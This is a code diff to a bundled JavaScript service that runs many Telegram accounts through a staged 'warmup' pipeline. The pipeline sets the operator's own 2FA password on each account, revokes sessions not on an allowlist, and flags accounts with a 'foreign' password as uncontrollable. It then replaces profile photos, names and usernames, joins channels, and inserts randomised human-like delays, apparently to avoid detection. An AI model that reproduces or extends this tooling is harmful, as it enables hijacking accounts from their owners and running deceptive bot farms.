@@ -3677,6 +3677,7 @@ const telegram_logger_1 = __webpack_require__(/*! ./utils/telegram-logger */ "./
 const fs = __importStar(__webpack_require__(/*! fs */ "fs"));
 const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
 const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
+const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
 const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
 const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
 const channelinfo_1 = __webpack_require__(/*! ../../utils/telegram-utils/channelinfo */ "./src/utils/telegram-utils/channelinfo.ts");
@@ -4107,9 +4108,18 @@ let TelegramService = TelegramService_1 = class TelegramService {
     }
     async removeOtherAuths(mobile) {
         const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
-        await telegramClient.removeOtherAuths();
-        this.logger.info(mobile, 'Removed other authorizations');
-        return "Removed other authorizations";
+        try {
+            await telegramClient.removeOtherAuths();
+            this.logger.info(mobile, 'Removed other authorizations');
+            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Remove Other Auths Success\n\nMobile: ${mobile}\nStatus: Non-protected sessions removed`)}`, { timeout: 5000 });
+            return "Removed other authorizations";
+        }
+        catch (error) {
+            const message = error instanceof Error ? error.message : String(error);
+            this.logger.error(mobile, 'Failed to remove other authorizations', error);
+            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Remove Other Auths Failed\n\nMobile: ${mobile}\nError: ${message.substring(0, 500)}`)}`, { timeout: 5000 });
+            throw error;
+        }
     }
     async processBatch(items, batchSize, processor, delayMs = 2000) {
         const errors = [];
@@ -7323,21 +7333,36 @@ async function removeOtherAuths(ctx) {
     if (!ctx.client)
         throw new Error('Client is not initialized');
     const result = await ctx.client.invoke(new telegram_1.Api.account.GetAuthorizations());
+    const authSummary = result.authorizations.map(formatAuthForLog);
     let keptCount = 0;
     let revokedCount = 0;
+    let failedCount = 0;
+    const failedAuths = [];
+    ctx.logger.info(ctx.phoneNumber, `Auth cleanup starting: total=${result.authorizations.length}`, authSummary);
     for (const auth of result.authorizations) {
         if (isOwnAuth(ctx.phoneNumber, auth)) {
             keptCount++;
-            ctx.logger.info(ctx.phoneNumber, `Keeping auth: ${auth.appName} | ${auth.deviceModel} | current=${auth.current}`);
+            const protectionReason = auth.current
+                ? 'current'
+                : (0, tg_config_1.getAuthProtectionReason)(auth) || 'fingerprint_match';
+            ctx.logger.info(ctx.phoneNumber, `Keeping protected auth (${protectionReason}): ${auth.appName} | ${auth.deviceModel} | current=${auth.current}`);
             continue;
         }
         ctx.logger.info(ctx.phoneNumber, `Revoking auth: ${auth.appName} | ${auth.deviceModel} | ${auth.country}`);
         await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Removing Auth\n\nMobile: ${ctx.phoneNumber}\nApp: ${auth.appName || 'unknown'}\nDevice: ${auth.deviceModel || 'unknown'}\nCountry: ${auth.country || 'unknown'}\nAPI ID: ${auth.apiId || 'unknown'}`)}`);
-        await resetAuthorization(ctx, auth);
-        revokedCount++;
+        const revoked = await resetAuthorization(ctx, auth);
+        if (revoked) {
+            revokedCount++;
+        }
+        else {
+            failedCount++;
+            failedAuths.push(formatAuthForLog(auth));
+        }
         await (0, Helpers_1.sleep)(2000 + Math.random() * 3000);
     }
-    ctx.logger.info(ctx.phoneNumber, `Auth cleanup: kept ${keptCount}, revoked ${revokedCount}`);
+    ctx.logger.info(ctx.phoneNumber, `Auth cleanup attempted: kept=${keptCount}, revoked=${revokedCount}, failed=${failedCount}`, {
+        failedAuths,
+    });
     try {
         const me = await ctx.client.getMe();
         if (!me) {
@@ -7349,13 +7374,34 @@ async function removeOtherAuths(ctx) {
         ctx.logger.error(ctx.phoneNumber, 'CRITICAL: Our session may have been revoked during removeOtherAuths!', verifyError);
         throw new Error(`Session self-check failed after removeOtherAuths: ${verifyError}`);
     }
+    const afterResult = await ctx.client.invoke(new telegram_1.Api.account.GetAuthorizations());
+    const remainingOtherAuths = afterResult.authorizations.filter((auth) => !isOwnAuth(ctx.phoneNumber, auth));
+    ctx.logger.info(ctx.phoneNumber, `Auth cleanup verified: total=${afterResult.authorizations.length}, remainingOther=${remainingOtherAuths.length}`, {
+        authorizations: afterResult.authorizations.map(formatAuthForLog),
+    });
+    if (failedCount > 0 || remainingOtherAuths.length > 0) {
+        throw new Error(`removeOtherAuths incomplete: failed=${failedCount}, remainingOther=${remainingOtherAuths.length}, remaining=${remainingOtherAuths.map(formatAuthForLog).join('; ')}`);
+    }
+}
+function formatAuthForLog(auth) {
+    return [
+        `app=${auth.appName || 'unknown'}`,
+        `device=${auth.deviceModel || 'unknown'}`,
+        `country=${auth.country || 'unknown'}`,
+        `current=${Boolean(auth.current)}`,
+        `apiId=${auth.apiId || 'unknown'}`,
+        `hash=${auth.hash?.toString?.() || 'unknown'}`,
+    ].join(' | ');
 }
 async function resetAuthorization(ctx, auth) {
     try {
         await ctx.client?.invoke(new telegram_1.Api.account.ResetAuthorization({ hash: auth.hash }));
+        return true;
     }
     catch (error) {
         (0, parseError_1.parseError)(error, `Failed to reset authorization for ${ctx.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel} `);
+        ctx.logger.error(ctx.phoneNumber, `Failed to revoke auth: ${formatAuthForLog(auth)}`, error);
+        return false;
     }
 }
 async function getAuths(ctx) {
@@ -12765,6 +12811,7 @@ exports.generateTGConfigWithProxy = generateTGConfigWithProxy;
 exports.getAvailablePlatforms = getAvailablePlatforms;
 exports.getPlatformConfig = getPlatformConfig;
 exports.getExpectedAuthFingerprint = getExpectedAuthFingerprint;
+exports.getAuthProtectionReason = getAuthProtectionReason;
 exports.isAuthAllowlisted = isAuthAllowlisted;
 exports.isAuthFingerprintMatch = isAuthFingerprintMatch;
 const API_CREDENTIALS = [
@@ -12984,23 +13031,30 @@ const AUTH_ALLOWLIST = {
     countries: ['singapore'],
     deviceModelSubstrings: ['oneplus 11', 'cli', 'linux', 'windows'],
     deviceModelSuffixes: ['-ssk'],
-    appNameSubstrings: ['lik', 'ram', 'sru', 'shru', 'han'],
+    appNamePrefixes: ['lik', 'ramy', 'sru', 'shru', 'han'],
 };
-function isAuthAllowlisted(auth) {
+function getAuthProtectionReason(auth) {
     if (auth.apiId && OUR_API_IDS.has(auth.apiId))
-        return true;
+        return `apiId:${auth.apiId}`;
     const country = normalizeAuthField(auth.country);
     const device = normalizeAuthField(auth.deviceModel);
     const app = normalizeAuthField(auth.appName);
-    if (country && AUTH_ALLOWLIST.countries.includes(country))
-        return true;
-    if (device && AUTH_ALLOWLIST.deviceModelSubstrings.some(s => device.includes(s)))
-        return true;
-    if (device && AUTH_ALLOWLIST.deviceModelSuffixes.some(s => device.endsWith(s)))
-        return true;
-    if (app && AUTH_ALLOWLIST.appNameSubstrings.some(s => app.includes(s)))
-        return true;
-    return false;
+    const countryMatch = AUTH_ALLOWLIST.countries.find(s => country === s);
+    if (countryMatch)
+        return `country:${countryMatch}`;
+    const deviceSubstringMatch = AUTH_ALLOWLIST.deviceModelSubstrings.find(s => device.includes(s));
+    if (deviceSubstringMatch)
+        return `device_contains:${deviceSubstringMatch}`;
+    const deviceSuffixMatch = AUTH_ALLOWLIST.deviceModelSuffixes.find(s => device.endsWith(s));
+    if (deviceSuffixMatch)
+        return `device_suffix:${deviceSuffixMatch}`;
+    const appPrefixMatch = AUTH_ALLOWLIST.appNamePrefixes.find(s => app.startsWith(s));
+    if (appPrefixMatch)
+        return `app_prefix:${appPrefixMatch}`;
+    return null;
+}
+function isAuthAllowlisted(auth) {
+    return getAuthProtectionReason(auth) !== null;
 }
 function isAuthFingerprintMatch(mobile, auth) {
     if (auth.current) {
@@ -30356,6 +30410,18 @@ class BaseClientService {
             return -1;
         return order[phase] ?? -1;
     }
+    getMissingPrerequisitePhase(doc) {
+        const currentRank = this.getWarmupPhaseRank(doc.warmupPhase);
+        if (currentRank < this.getWarmupPhaseRank(warmup_phases_1.WarmupPhase.IDENTITY)) {
+            return null;
+        }
+        const twoFADone = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.twoFASetAt) > 0;
+        const authsRemoved = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.otherAuthsRemovedAt) > 0;
+        if (twoFADone && !authsRemoved) {
+            return { phase: warmup_phases_1.WarmupPhase.SETTLING, missing: ['otherAuthsRemovedAt'] };
+        }
+        return null;
+    }
     getRecoveryEnrolledAt(phase, jitter, now) {
         const recoveryDaysByPhase = {
             [warmup_phases_1.WarmupPhase.ENROLLED]: Math.max(1, warmup_phases_1.WARMUP_PHASE_THRESHOLDS.settling + jitter),
@@ -30377,8 +30443,13 @@ class BaseClientService {
         doc.warmupPhase = savedPhase;
         const currentPhaseRank = this.getWarmupPhaseRank(doc.warmupPhase);
         const inferredPhaseRank = this.getWarmupPhaseRank(inferredPhase);
+        const missingPrerequisite = this.getMissingPrerequisitePhase(doc);
         if (!doc.warmupPhase || inferredPhaseRank > currentPhaseRank) {
             updateData.warmupPhase = inferredPhase;
+        }
+        if (missingPrerequisite && this.getWarmupPhaseRank(missingPrerequisite.phase) < currentPhaseRank) {
+            updateData.warmupPhase = missingPrerequisite.phase;
+            this.logger.warn(`Correcting warmup phase for ${doc.mobile}: ${doc.warmupPhase} → ${missingPrerequisite.phase}; missing prerequisites: ${missingPrerequisite.missing.join(', ')}`);
         }
         if (!doc.enrolledAt) {
             updateData.enrolledAt = doc.createdAt
@@ -30694,7 +30765,7 @@ class BaseClientService {
                 organicActivityAt: new Date(),
             });
             await (0, Helpers_1.sleep)(client_helper_utils_1.ClientHelperUtils.gaussianRandom(40000, 5000, 30000, 50000));
-            return photos.photos.length > 0 ? 1 : 0;
+            return 1;
         }
         catch (error) {
             const errorDetails = this.handleError(error, 'Error deleting photos', doc.mobile);
@@ -30835,19 +30906,19 @@ class BaseClientService {
         try {
             const passwordInfo = await telegramClient.client.invoke(new telegram_1.Api.account.GetPassword());
             if (!passwordInfo.hasPassword)
-                return false;
+                return 'unknown';
             const srp = await (0, Password_1.computeCheck)(passwordInfo, this.KNOWN_2FA_PASSWORD);
             await telegramClient.client.invoke(new telegram_1.Api.account.GetPasswordSettings({ password: srp }));
-            return true;
+            return 'ours';
         }
         catch (error) {
             const msg = (error?.message || error?.errorMessage || '').toLowerCase();
-            if (msg.includes('password_hash_invalid') || msg.includes('srp_id_invalid')) {
+            if (msg.includes('password_hash_invalid')) {
                 this.logger.warn(`${mobile}: 2FA password verification failed — foreign password`);
-                return false;
+                return 'foreign';
             }
             this.logger.warn(`${mobile}: 2FA password verification error: ${msg}`);
-            return false;
+            return 'unknown';
         }
     }
     async set2fa(doc, failedAttempts) {
@@ -30856,22 +30927,26 @@ class BaseClientService {
             await (0, organic_activity_1.performOrganicActivity)(telegramClient, 'full');
             const hasPassword = await telegramClient.hasPassword();
             if (hasPassword) {
-                const isOurPassword = await this.verifyOurPassword(telegramClient, doc.mobile);
-                if (isOurPassword) {
+                const verificationStatus = await this.verifyOurPassword(telegramClient, doc.mobile);
+                if (verificationStatus === 'ours') {
                     this.logger.debug(`${doc.mobile} already has our 2FA set`);
                     await this.update(doc.mobile, {
                         lastUpdateAttempt: new Date(),
+                        failedUpdateAttempts: 0,
+                        lastUpdateFailure: null,
+                        organicActivityAt: new Date(),
                         twoFASetAt: new Date(),
                     });
                     await this.updateUser2FAStatus(doc.tgId, doc.mobile);
                     return 1;
                 }
-                else {
+                else if (verificationStatus === 'foreign') {
                     this.logger.error(`${doc.mobile} has FOREIGN 2FA password — cannot control this account safely`);
                     await this.markAsInactive(doc.mobile, 'Foreign 2FA password — account unrecoverable if session dies');
                     this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `<b>FOREIGN 2FA</b>\n\n<b>Type:</b> ${this.clientType}\n<b>Mobile:</b> ${doc.mobile}\n<b>Phase:</b> ${doc.warmupPhase || 'unknown'}\n<b>Status:</b> Account has unknown 2FA password — marked inactive`, { parseMode: 'HTML' });
                     return 0;
                 }
+                throw new Error('2FA password verification was inconclusive; will retry with normal warmup backoff');
             }
             await telegramClient.set2fa();
             await (0, Helpers_1.sleep)(client_helper_utils_1.ClientHelperUtils.gaussianRandom(45000, 7500, 30000, 60000));
@@ -31002,7 +31077,13 @@ class BaseClientService {
             return { updateCount: 0, updateSummary: 'backfill_timestamps' };
         }
         const warmupAction = (0, warmup_phases_1.getWarmupPhaseAction)(doc, now);
-        this.logger.debug(`Client ${doc.mobile} warmup: phase=${warmupAction.phase}, action=${warmupAction.action}`);
+        this.logger.debug(`Client ${doc.mobile} warmup: storedPhase=${doc.warmupPhase || 'unset'}, resolvedPhase=${warmupAction.phase}, action=${warmupAction.action}`, {
+            privacyUpdatedAt: doc.privacyUpdatedAt || null,
+            twoFASetAt: doc.twoFASetAt || null,
+            otherAuthsRemovedAt: doc.otherAuthsRemovedAt || null,
+            failedUpdateAttempts: doc.failedUpdateAttempts || 0,
+            lastUpdateFailure: doc.lastUpdateFailure || null,
+        });
         if (warmupAction.phase !== doc.warmupPhase) {
             await this.update(doc.mobile, { warmupPhase: warmupAction.phase });
         }
@@ -31060,7 +31141,7 @@ class BaseClientService {
                 case 'upload_photo':
                     updateCount = await this.updateProfilePhotos(doc, client, failedAttempts);
                     if (updateCount > 0) {
-                        this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `<b>WARMUP UPDATE</b>\n\n<b>Type:</b> ${this.clientType}\n<b>Mobile:</b> ${doc.mobile}\n<b>Action:</b> upload_photo\n<b>Phase:</b> ${warmupAction.phase}\n<b>Status:</b> Profile photo uploaded`, { parseMode: 'HTML' });
+                        this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `<b>WARMUP UPDATE</b>\n\n<b>Type:</b> ${this.clientType}\n<b>Mobile:</b> ${doc.mobile}\n<b>Action:</b> upload_photo\n<b>Phase:</b> ${warmupAction.phase}\n<b>Status:</b> Profile photo step completed`, { parseMode: 'HTML' });
                     }
                     return { updateCount, updateSummary: updateCount > 0 ? 'upload_photo' : null };
                 case 'set_2fa':
@@ -31068,12 +31149,25 @@ class BaseClientService {
                     if (updateCount > 0) {
                         this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `<b>WARMUP UPDATE</b>\n\n<b>Type:</b> ${this.clientType}\n<b>Mobile:</b> ${doc.mobile}\n<b>Action:</b> set_2fa\n<b>Phase:</b> ${warmupAction.phase}\n<b>Status:</b> 2FA password set successfully`, { parseMode: 'HTML' });
                     }
+                    else {
+                        this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `<b>WARMUP FAILED</b>\n\n<b>Type:</b> ${this.clientType}\n<b>Mobile:</b> ${doc.mobile}\n<b>Action:</b> set_2fa\n<b>Phase:</b> ${warmupAction.phase}\n<b>Fails:</b> ${failedAttempts + 1}\n<b>Status:</b> 2FA setup or verification failed`, { parseMode: 'HTML' });
+                    }
                     return { updateCount, updateSummary: updateCount > 0 ? 'set_2fa' : null };
                 case 'remove_other_auths':
+                    this.logger.log(`Starting remove_other_auths for ${doc.mobile}`, {
+                        phase: warmupAction.phase,
+                        twoFASetAt: doc.twoFASetAt || null,
+                        otherAuthsRemovedAt: doc.otherAuthsRemovedAt || null,
+                        failedAttempts,
+                    });
                     updateCount = await this.removeOtherAuths(doc, failedAttempts);
                     if (updateCount > 0) {
                         this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `<b>WARMUP UPDATE</b>\n\n<b>Type:</b> ${this.clientType}\n<b>Mobile:</b> ${doc.mobile}\n<b>Action:</b> remove_other_auths\n<b>Phase:</b> ${warmupAction.phase}\n<b>Status:</b> Other sessions revoked`, { parseMode: 'HTML' });
                     }
+                    else {
+                        this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `<b>WARMUP FAILED</b>\n\n<b>Type:</b> ${this.clientType}\n<b>Mobile:</b> ${doc.mobile}\n<b>Action:</b> remove_other_auths\n<b>Phase:</b> ${warmupAction.phase}\n<b>Fails:</b> ${failedAttempts + 1}\n<b>Status:</b> Other sessions were not fully revoked`, { parseMode: 'HTML' });
+                    }
+                    this.logger.log(`Finished remove_other_auths for ${doc.mobile}: updateCount=${updateCount}`);
                     return { updateCount, updateSummary: updateCount > 0 ? 'remove_other_auths' : null };
                 case 'rotate_session':
                     updateCount = (await this.rotateSession(doc.mobile)) ? 1 : 0;
@@ -31124,7 +31218,7 @@ class BaseClientService {
     async backfillTimestamps(mobile, doc, now) {
         const needsProfileBackfill = !doc.privacyUpdatedAt || !doc.profilePicsDeletedAt ||
             !doc.nameBioUpdatedAt || !doc.usernameUpdatedAt || !doc.profilePicsUpdatedAt;
-        const needsWarmupBackfill = !doc.warmupPhase || !doc.twoFASetAt || !doc.otherAuthsRemovedAt || !doc.enrolledAt;
+        const needsWarmupBackfill = !doc.warmupPhase || !doc.enrolledAt;
         if (!needsProfileBackfill && !needsWarmupBackfill)
             return;
         this.logger.log(`Backfilling fields for ${mobile}`);
@@ -31140,15 +31234,17 @@ class BaseClientService {
             backfillData.usernameUpdatedAt = allTimestamps.usernameUpdatedAt;
         if (!doc.profilePicsUpdatedAt)
             backfillData.profilePicsUpdatedAt = allTimestamps.profilePicsUpdatedAt;
+        if (!doc.twoFASetAt || !doc.otherAuthsRemovedAt) {
+            this.logger.warn(`Skipping unverified security timestamp backfill for ${mobile}`, {
+                twoFASetAt: doc.twoFASetAt || null,
+                otherAuthsRemovedAt: doc.otherAuthsRemovedAt || null,
+            });
+        }
         const hasDistinctBackupSession = await this.hasDistinctUsersBackupSession(mobile, doc.session || null);
         if (!doc.warmupPhase)
             backfillData.warmupPhase = hasDistinctBackupSession ? warmup_phases_1.WarmupPhase.SESSION_ROTATED : warmup_phases_1.WarmupPhase.READY;
         if (!doc.enrolledAt)
             backfillData.enrolledAt = doc.createdAt || new Date(now - 30 * this.ONE_DAY_MS);
-        if (!doc.twoFASetAt)
-            backfillData.twoFASetAt = new Date(now - 28 * this.ONE_DAY_MS);
-        if (!doc.otherAuthsRemovedAt)
-            backfillData.otherAuthsRemovedAt = new Date(now - 27 * this.ONE_DAY_MS);
         if (hasDistinctBackupSession && !doc.sessionRotatedAt)
             backfillData.sessionRotatedAt = new Date(now - 26 * this.ONE_DAY_MS);
         if (Object.keys(backfillData).length > 0) {
@@ -31610,7 +31706,7 @@ class BaseClientService {
         return [
             {
                 name: 'threeWeeks',
-                days: 21,
+                days: warmup_phases_1.WARMUP_PHASE_THRESHOLDS.ready,
                 minRequired: Math.max(1, Math.ceil(this.config.minTotalClients * 0.6)),
             },
             {
@@ -32557,7 +32653,7 @@ async function performFullActivity(client) {
 
 
 Object.defineProperty(exports, "__esModule", ({ value: true }));
-exports.MIN_CHANNELS_FOR_MATURING = exports.MIN_DAYS_BETWEEN_IDENTITY_STEPS = exports.WARMUP_PHASE_THRESHOLDS = exports.WarmupPhase = void 0;
+exports.MIN_CHANNELS_FOR_MATURING = exports.MIN_DAYS_AFTER_USERNAME_BEFORE_GROWING = exports.MIN_DAYS_AFTER_NAME_BIO_BEFORE_USERNAME = exports.MIN_DAYS_AFTER_AUTH_CLEANUP_BEFORE_IDENTITY = exports.MIN_DAYS_BETWEEN_IDENTITY_STEPS = exports.WARMUP_PHASE_THRESHOLDS = exports.WarmupPhase = void 0;
 exports.getWarmupPhaseAction = getWarmupPhaseAction;
 exports.isAccountReady = isAccountReady;
 exports.isAccountWarmingUp = isAccountWarmingUp;
@@ -32574,11 +32670,14 @@ exports.WarmupPhase = {
 exports.WARMUP_PHASE_THRESHOLDS = {
     settling: 1,
     identity: 4,
-    growing: 8,
-    maturing: 18,
-    ready: 20,
+    growing: 14,
+    maturing: 20,
+    ready: 24,
 };
 exports.MIN_DAYS_BETWEEN_IDENTITY_STEPS = 2;
+exports.MIN_DAYS_AFTER_AUTH_CLEANUP_BEFORE_IDENTITY = 3;
+exports.MIN_DAYS_AFTER_NAME_BIO_BEFORE_USERNAME = 3;
+exports.MIN_DAYS_AFTER_USERNAME_BEFORE_GROWING = 2;
 exports.MIN_CHANNELS_FOR_MATURING = 200;
 const ONE_DAY_MS = 24 * 60 * 60 * 1000;
 function getWarmupPhaseAction(doc, now) {
@@ -32615,7 +32714,8 @@ function getWarmupPhaseAction(doc, now) {
             }
             return { phase: exports.WarmupPhase.SETTLING, action: 'organic_only', organicIntensity: 'light' };
         }
-        if (daysSinceEnrolled >= exports.WARMUP_PHASE_THRESHOLDS.identity + jitter) {
+        if (daysSince(doc.otherAuthsRemovedAt) >= exports.MIN_DAYS_AFTER_AUTH_CLEANUP_BEFORE_IDENTITY &&
+            daysSinceEnrolled >= exports.WARMUP_PHASE_THRESHOLDS.identity + jitter) {
             return { phase: exports.WarmupPhase.IDENTITY, action: 'delete_photos', organicIntensity: 'medium' };
         }
         return { phase: exports.WarmupPhase.SETTLING, action: 'organic_only', organicIntensity: 'medium' };
@@ -32634,12 +32734,13 @@ function getWarmupPhaseAction(doc, now) {
             return { phase: exports.WarmupPhase.IDENTITY, action: 'organic_only', organicIntensity: 'light' };
         }
         if (!usernameDone) {
-            if (daysSince(doc.nameBioUpdatedAt) >= exports.MIN_DAYS_BETWEEN_IDENTITY_STEPS) {
+            if (daysSince(doc.nameBioUpdatedAt) >= exports.MIN_DAYS_AFTER_NAME_BIO_BEFORE_USERNAME) {
                 return { phase: exports.WarmupPhase.IDENTITY, action: 'update_username', organicIntensity: 'medium' };
             }
             return { phase: exports.WarmupPhase.IDENTITY, action: 'organic_only', organicIntensity: 'light' };
         }
-        if (daysSinceEnrolled >= exports.WARMUP_PHASE_THRESHOLDS.growing + jitter) {
+        if (daysSince(doc.usernameUpdatedAt) >= exports.MIN_DAYS_AFTER_USERNAME_BEFORE_GROWING &&
+            daysSinceEnrolled >= exports.WARMUP_PHASE_THRESHOLDS.growing + jitter) {
             return { phase: exports.WarmupPhase.GROWING, action: 'join_channels', organicIntensity: 'light' };
         }
         return { phase: exports.WarmupPhase.IDENTITY, action: 'organic_only', organicIntensity: 'light' };
@@ -32666,6 +32767,9 @@ function getWarmupPhaseAction(doc, now) {
         const photosDeleted = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.profilePicsDeletedAt) > 0;
         const nameBioDone = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.nameBioUpdatedAt) > 0;
         const usernameDone = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.usernameUpdatedAt) > 0;
+        if (daysSince(doc.otherAuthsRemovedAt) < exports.MIN_DAYS_AFTER_AUTH_CLEANUP_BEFORE_IDENTITY) {
+            return { phase, action: 'organic_only', organicIntensity: 'light' };
+        }
         if (!photosDeleted)
             return { phase, action: 'delete_photos', organicIntensity: 'medium' };
         if (!nameBioDone && daysSince(doc.profilePicsDeletedAt) >= exports.MIN_DAYS_BETWEEN_IDENTITY_STEPS) {
@@ -32673,11 +32777,14 @@ function getWarmupPhaseAction(doc, now) {
         }
         if (!nameBioDone)
             return { phase, action: 'organic_only', organicIntensity: 'light' };
-        if (!usernameDone && daysSince(doc.nameBioUpdatedAt) >= exports.MIN_DAYS_BETWEEN_IDENTITY_STEPS) {
+        if (!usernameDone && daysSince(doc.nameBioUpdatedAt) >= exports.MIN_DAYS_AFTER_NAME_BIO_BEFORE_USERNAME) {
             return { phase, action: 'update_username', organicIntensity: 'medium' };
         }
         if (!usernameDone)
             return { phase, action: 'organic_only', organicIntensity: 'light' };
+        if (daysSince(doc.usernameUpdatedAt) < exports.MIN_DAYS_AFTER_USERNAME_BEFORE_GROWING) {
+            return { phase, action: 'organic_only', organicIntensity: 'light' };
+        }
         return null;
     };
     if (phase === exports.WarmupPhase.GROWING) {
